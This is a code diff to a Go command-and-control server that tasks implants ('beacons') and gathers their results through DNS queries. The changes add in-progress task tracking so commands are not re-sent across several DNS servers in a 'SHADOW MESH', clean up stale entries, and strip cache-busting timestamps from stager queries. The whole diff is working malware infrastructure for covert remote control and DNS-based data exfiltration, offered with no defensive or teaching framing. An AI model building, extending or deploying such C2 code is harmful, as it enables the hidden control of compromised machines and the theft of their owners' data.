@@ -140,6 +140,7 @@ type C2Manager struct {
 	submittedData        map[string]bool                 // key: taskID, value: true if we submitted any data to Master
 	metadataAssemblers   map[string]*metadataAssembler   // key: normalized session tag, value: pending metadata buffers
 	pendingLabelChunks   map[string][]pendingLabelChunk  // key: normalized session tag, value: buffered data frames awaiting metadata
+	tasksInProgress      map[string]time.Time            // key: taskID, value: first chunk received time (prevents re-delivery)
 	mutex                sync.RWMutex
 	taskCounter          int // Counter for local tasks (standalone mode)
 	domainTaskCounter    int // Counter for domain update tasks (D prefix to avoid conflicts)
@@ -192,6 +193,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 		recentMessages:       make(map[string]time.Time),
 		resultBatchBuffer:    make(map[string][]ResultChunk),
 		resultBatchTimer:     make(map[string]*time.Timer),
+		tasksInProgress:      make(map[string]time.Time),
 		db:                   db,
 		taskCounter:          TaskCounterStart,
 		domainTaskCounter:    DomainTaskCounterStart,
@@ -620,7 +622,21 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 				delete(c2.recentMessages, msgHash)
 			}
 		}
+
+		// Clean up old in-progress task entries (tasks that never completed)
+		// Keep entries for 30 minutes to handle long-running commands
+		inProgressCleanupCount := 0
+		for taskID, startTime := range c2.tasksInProgress {
+			if now.Sub(startTime) > 30*time.Minute {
+				delete(c2.tasksInProgress, taskID)
+				inProgressCleanupCount++
+			}
+		}
 		c2.mutex.Unlock()
+
+		if c2.debug && inProgressCleanupCount > 0 {
+			logf("[C2] Cleaned up %d stale in-progress task entries", inProgressCleanupCount)
+		}
 
 		// Process expired results outside the lock
 		for _, expired := range expiredResults {
@@ -1688,9 +1704,32 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	}
 
 	// Payload is everything before the domain
-	// e.g. payload.domain.com -> payload
+	// e.g. payload.timestamp.domain.com -> payload (strip timestamp too)
+	// Format: <base36_data>[.<more_data>].<timestamp>.<domain>
 	domainParts := strings.Split(c2.domain, ".")
 	payloadParts := parts[:len(parts)-len(domainParts)]
+
+	// SHADOW MESH: Stagers include a timestamp label for cache busting
+	// Format: payload.timestamp.domain or payload1.payload2.timestamp.domain
+	// We need to strip the timestamp (last numeric label before domain)
+	if len(payloadParts) >= 2 {
+		lastPart := payloadParts[len(payloadParts)-1]
+		// Check if last part is a unix timestamp (all digits, reasonable length)
+		if len(lastPart) >= 9 && len(lastPart) <= 11 {
+			isTimestamp := true
+			for _, c := range lastPart {
+				if c < '0' || c > '9' {
+					isTimestamp = false
+					break
+				}
+			}
+			if isTimestamp {
+				// Strip the timestamp
+				payloadParts = payloadParts[:len(payloadParts)-1]
+			}
+		}
+	}
+
 	encodedPayload := strings.Join(payloadParts, "")
 
 	// Decode payload - try encrypted first (for beacons), then plain base36 (for stagers)
@@ -1801,6 +1840,19 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		if len(beacon.TaskQueue) > 0 {
 			// Get next task
 			task := beacon.TaskQueue[0]
+
+			// SHADOW MESH: Check if this task is already in-progress (being executed)
+			// This prevents re-delivering a task when beacon checks in via different DNS server
+			if _, inProgress := c2.tasksInProgress[task.ID]; inProgress {
+				// Task is already being executed - skip it and remove from queue
+				beacon.TaskQueue = beacon.TaskQueue[1:]
+				if c2.debug {
+					logf("[C2] Skipping task %s for beacon %s - already in progress", task.ID, beacon.ID)
+				}
+				c2.mutex.Unlock()
+				return "ACK", true
+			}
+
 			beacon.TaskQueue = beacon.TaskQueue[1:] // Dequeue
 			beacon.CurrentTask = task.ID
 			task.Status = "sent"
@@ -1840,8 +1892,16 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		totalSize, _ := strconv.Atoi(msgParts[3])
 		totalChunks, _ := strconv.Atoi(msgParts[4])
 
-		// Track metadata locally (for totalChunks lookup and logging)
+		// Mark task as in-progress to prevent re-delivery by this DNS server
 		c2.mutex.Lock()
+		if _, inProgress := c2.tasksInProgress[taskID]; !inProgress {
+			c2.tasksInProgress[taskID] = time.Now()
+			if c2.debug {
+				logf("[C2] Task %s marked in-progress (received RESULT_META)", taskID)
+			}
+		}
+
+		// Track metadata locally (for totalChunks lookup and logging)
 		if _, exists := c2.expectedResults[taskID]; !exists {
 			c2.expectedResults[taskID] = &ExpectedResult{
 				BeaconID:    beaconID,
@@ -1891,6 +1951,16 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		taskID := dataParts[2]
 		chunkIndex, _ := strconv.Atoi(dataParts[3])
 
+		// Mark task as in-progress to prevent re-delivery by this DNS server
+		c2.mutex.Lock()
+		if _, inProgress := c2.tasksInProgress[taskID]; !inProgress {
+			c2.tasksInProgress[taskID] = time.Now()
+			if c2.debug {
+				logf("[C2] Task %s marked in-progress (received DATA chunk %d)", taskID, chunkIndex)
+			}
+		}
+		c2.mutex.Unlock()
+
 		// Get totalChunks from expected results (if we have it)
 		var totalChunks int
 		c2.mutex.RLock()
@@ -1935,6 +2005,9 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		} else {
 			totalChunks = totalChunksFromMsg
 		}
+
+		// Clean up in-progress tracking
+		delete(c2.tasksInProgress, taskID)
 
 		// Update local task status and clear beacon's current task
 		if task, taskExists := c2.tasks[taskID]; taskExists {
